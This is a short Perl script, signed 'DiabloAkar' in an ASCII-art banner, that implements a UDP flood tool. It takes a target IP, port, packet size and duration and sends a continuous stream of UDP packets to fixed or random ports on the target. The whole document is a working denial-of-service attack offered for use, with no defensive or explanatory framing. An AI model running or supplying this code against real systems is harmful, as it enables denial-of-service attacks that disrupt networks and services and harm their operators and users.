#!/usr/bin/perl

##############
#                   .-"      "-.
#                  /            \
#                 |   DiabloAkar |
#                 |,  .-.  .-.  ,|
#                 | )(__/  \__)( |
#                 |/     /\     \|
#       (@_       (_     ^^     _)
#  _     ) \_______\__|IIIIII|__/__________________
# (_)@8@8{}<________|-\IIIIII/-|_D_I_A_B_L_O_A_K_A_R_>
#        )_/        \          /
#       (@           `--------` 
#	                Hosgeldiniz!
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "cyber.pl <ip> <port> <size> <time>\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, AF_INET, SOCK_DGRAM, 17);

 
print "Flooding $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}